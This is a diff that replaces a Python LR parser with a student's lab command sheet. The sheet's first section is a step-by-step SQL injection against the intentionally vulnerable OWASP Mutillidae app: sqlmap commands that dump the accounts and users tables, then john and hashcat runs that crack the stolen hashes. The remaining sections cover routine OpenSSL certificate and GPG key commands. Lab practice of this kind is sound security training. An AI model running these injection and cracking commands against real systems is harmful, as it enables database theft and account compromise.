@@ -1,74 +1,68 @@
-class parser:
-    def __init__(self):
-        self.rules=[]
-        self.stack=[]
-        self.table=[]
-    def parse(self,word):
-        self.stack.append("$")
-        self.stack.append(0)
-        #S=AC
-        #   a b A B
-        #0  s8
-        #1    r1
-        temp_state = '-'
-        while True:
-            state = self.stack[-1]
-            print(word,"\n",self.stack,"\n",temp_state)
-            temp_state = self.table[state][word[0]]
+SQL Injection Attack
+Start OWASP BWA VM → Get IP using ifconfig → Note the IP (e.g., 192.168.1.100)
+Open Kali Linux → Launch Firefox → Go to http://192.168.1.100 → Click "OWASP Mutillidae II"
+Navigate in Mutillidae: OWASP 2013 → A1 Injection (SQL) → SQLMAP Practice → View Someone’s Blog → Choose username → Click "View Blog Entries"
+Open BurpSuite CE → Enable Intercept → Submit form in browser → Copy POST request → Save as sql_request.txt → Turn Intercept OFF
+Commands:
 
-            if "r" in self.table[state][word[0]]:
-                prodNo = int(self.table[state][word[0]][-1])
-                lhs,rhs = self.rules[prodNo-1].split("=")
-                for i in range(0,2*len(rhs)):
-                    self.stack.pop()
-                state = self.stack[-1]
-                self.stack.append(lhs)
-                self.stack.append(self.table[state][lhs])
-            elif "s" in self.table[state][word[0]]:
-                self.stack.append(word[0])
-                self.stack.append(int(self.table[state][word[0]][-1]))
-                word = word[1:]
-            elif self.table[state][word[0]]=="accept":
-                break
-            else:
-                print("error")
-                break
-        print("Success")
-par = parser()
-# rules = input("Enter rules S=Ac,S=nc: ").split(",")
-# no = int(input("No of states: "))
-# for i in range(no):
-#     temp = {}
-#     while True:
-#         lhs = input("Term/Non term:")
-#         if lhs=="end":
-#             break
-#         rhs = input("Goto/Action")
-#         if rhs.isdigit():
-#             rhs = int(rhs)
-#         temp[lhs] = rhs
-#     par.table.append(temp)
+sqlmap -r sql_request.txt -D mutillidae --tables
+sqlmap -r sql_request.txt -D mutillidae -T accounts --dump
+grep "Referer" sql_request.txt | awk '{print $2}'
+grep "author" sql_request.txt
+grep "Cookie" sql_request.txt | sed 's/Cookie: //'
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" --dbs
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae --tables
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae -T accounts --dump
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae -T users --dump
+cat dumped_data.txt | awk '{print $4}' > hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
-par.rules = ['S=AA', 'A=aA', 'A=b']
-
-# Parsing Table (list of dictionaries for each state)
-par.table = [
-    {'a': 's3', 'b': 's4', 'S': 1, 'A': 2},
-    {'$': 'accept'},
-    {'a': 's3', 'b': 's4', 'A': 5},
-    {'a': 's3', 'b': 's4', 'A': 6},
-    {'$': 'r3', 'a': 'r3', 'b': 'r3'},
-    {'$': 'r1'},
-    {'$': 'r2', 'a': 'r2', 'b': 'r2'},
-]
-
-# Word to parse
-word = "aabb$"
-par.parse(word)
+SSL
+openssl version
+openssl version -a
+openssl genrsa -out yourdomain.key 2048
+openssl genpkey -out fd.key -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -aes-128-cbc
+cat yourdomain.key
+openssl rsa -text -in yourdomain.key -noout
+openssl rsa -in yourdomain.key -pubout -out yourdomain_public.key
+cat yourdomain_public.key
+openssl req -new -key yourdomain.key -out yourdomain.csr
+cat yourdomain.csr
+openssl req -new -config fd.cnf -key fd.key -out fd.csr
+cat fd.csr
+openssl req -new -key yourdomain.key -out yourdomain.csr -subj "/C=US/ST=Utah/L=Lehi/O=Your Company, Inc./OU=IT/CN=yourdomain.com"
+openssl req -text -in yourdomain.csr -noout -verify
+openssl x509 -req -days 365 -in fd.csr -signkey fd.key -out fd.crt
+cat fd.crt
+openssl x509 -text -in yourdomain.crt -noout
+openssl pkcs12 -export -name "yourdomain-digicert-(expiration date)" -out yourdomain.pfx -inkey yourdomain.key -in yourdomain.crt
+openssl pkey -pubout -in ./private.key | openssl sha256
+openssl req -pubkey -in ./request.csr -noout | openssl sha256
+openssl x509 -pubkey -in ./certificate.crt -noout | openssl sha256
 
 
-
-
-
-
-
+Cloud - GPG
+gpg --delete-secret-keys your_email@example.com
+gpg --delete-keys your_email@example.com
+sudo apt-get install gnupg
+gpg --gen-key
+gpg --output ~/revocation.crt --gen-revoke your_email@example.com
+chmod 600 ~/revocation.crt
+gpg --output ~/mygpg.key --armor --export your_email@example.com
+cat mygpg.key
+gpg --import mygpg.key
+gpg --fingerprint recipient_email@example.com
+gpg --sign-key recipient_email@example.com
+gpg --output ~/signed.key --export --armor recipient_email@example.com
+nano message.txt
+cat message.txt
+gpg --encrypt --sign --armor -r recipient_email@example.com message.txt
+gpg message.txt.asc
+cat message1.txt
+cat message.txt.asc
+gpg --list-keys
+gpg --refresh-keys
+gpg --import revocation.crt
+gpg --keyserver pgp.mit.edu --send-keys key_ID
+gpg --send-keys --keyserver keyserver.ubuntu.com key_ID
